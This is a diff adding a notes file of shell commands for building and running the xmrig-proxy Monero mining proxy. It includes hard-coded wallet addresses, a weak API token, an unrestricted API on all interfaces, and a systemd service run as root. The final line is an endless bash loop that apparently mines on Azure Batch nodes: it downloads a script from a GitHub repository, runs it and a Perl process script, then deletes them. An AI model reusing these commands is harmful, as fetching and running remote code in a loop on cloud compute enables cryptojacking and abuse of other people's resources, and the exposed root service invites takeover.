@@ -1,0 +1,55 @@
+Wdff7fGGVVPK
+
+sudo apt update
+
+sudo apt-get --assume-yes install git build-essential cmake libuv1-dev uuid-dev libmicrohttpd-dev libssl-dev nano
+
+sudo apt install 
+
+git clone https://github.com/xmrig/xmrig-proxy.git
+
+mkdir xmrig-proxy/build
+cd xmrig-proxy/build
+cmake ..
+make
+
+mv  xmrig-proxy Proxy
+
+./xmrig-proxy -S -l logfile.txt -r 2 -R 10 --donate-level 0 --api-port 4444 --api-worker-id Proxy --api-access-token 1234567890 --api-no-restricted -b 0.0.0.0:3333 --workers ip -o pool.supportxmr.com:5555 -u 454BzuiXKEFjBCqQHmxAahEjGNLr9Eg4kJQdH33ryLWz99Aar391G89TFdPbExdtBQBYqy8EaUgffj4jri8JAEr59TtMrWb --algo=rx/0 -p Proxy-OVH -k
+
+sudo nano /etc/systemd/system/Proxy2.service
+
+[Unit]
+Description=Proxy2
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=1
+User=root
+ExecStart=/home/ubuntu/xmrig-proxy/build/xmrig-proxy -S -l logfile.txt -r 2 -R 10 --donate-level 0 --api-port 5555 --api-worker-id Proxy --api-access-token 1234567890 --api-no-restricted -b 0.0.0.0:4444 --workers ip -o pool.supportxmr.com:5555 -u 454BzuiXKEFjBCqQHmxAahEjGNLr9Eg4kJQdH33ryLWz99Aar391G89TFdPbExdtBQBYqy8EaUgffj4jri8JAEr59TtMrWb --algo=rx/0 -p Proxy1 -k
+
+[Install]
+WantedBy=multi-user.target
+
+-------------------------------
+
+sudo systemctl start Proxy1
+
+sudo systemctl enable Proxy1
+
+sudo systemctl status Proxy1
+
+sudo systemctl stop Proxy1
+
+sudo systemctl restart Proxy1
+
+-------------------------------
+
+free -m -t
+
+-------------------------------
+
+/bin/bash -c "export pool_pass1=${AZ_BATCH_POOL_ID}:azure;export pool_address1=51.91.9.68:3333;export wallet1=49TNuu3MhpBMy1ZnwdTNQw7SGqGRyppv1NQGu6ofDi61XojATrvHk5NG7TaQmHtefCNaCPD5cGY2B4zsRQj5iWFtVbbXidc;export nicehash1=true;export pool_pass2=${AZ_BATCH_POOL_ID}:azure;export pool_address2=51.91.9.68:3333;export wallet2=49TNuu3MhpBMy1ZnwdTNQw7SGqGRyppv1NQGu6ofDi61XojATrvHk5NG7TaQmHtefCNaCPD5cGY2B4zsRQj5iWFtVbbXidc;export nicehash2=true;while [ 1 ] ;do wget https://raw.githubusercontent.com/U117A/azure-cloud/master/setup_vm3.sh; chmod u+x setup_vm3.sh ; ./setup_vm3.sh ; cd azure-cloud; cd azure_script; chmod u+x run_process.pl; ./run_process.pl 30; cd ..; cd ..; rm -rf azure-cloud ; rm -rf setup_vm3.sh; done;"
+
+
